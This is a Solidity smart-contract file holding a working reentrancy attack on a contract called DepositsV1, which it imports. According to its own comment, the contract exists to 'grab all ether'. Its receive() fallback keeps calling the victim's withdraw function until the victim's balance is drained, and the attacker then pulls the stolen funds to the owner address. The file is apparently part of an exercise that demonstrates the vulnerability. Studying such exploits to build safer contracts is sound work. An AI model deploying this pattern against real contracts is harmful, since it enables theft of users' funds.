//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./deposits-v1.sol";

error NotAnOwner();

/* attacks withdraw method in depostsV1 to grab all ether */

contract ReentancyAttack {
    address owner;

    DepositsV1 internal depositsV1;
    bytes32 internal withdrawSecret;

    constructor(address depositsV1Address) {
        owner = msg.sender;
        depositsV1 = DepositsV1(depositsV1Address);
    }

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotAnOwner();
        _;
    }

    // Receive is called when deposits contract sends Ether to this contract.
    receive() external payable {
        if (address(depositsV1).balance >= msg.value) {
            depositsV1.withdraw(withdrawSecret);
        }
    }

    function attack(
        bytes32 hashedSecret,
        bytes32 _withdrawSecret
    ) external payable onlyOwner {
        withdrawSecret = _withdrawSecret;

        depositsV1.deposit{value: msg.value}(hashedSecret);
        depositsV1.withdraw(_withdrawSecret);
    }

    function withdraw() external onlyOwner {
        (bool success, ) = owner.call{value: address(this).balance}("");

        if (!success) revert FailedToSendEther();
    }
}
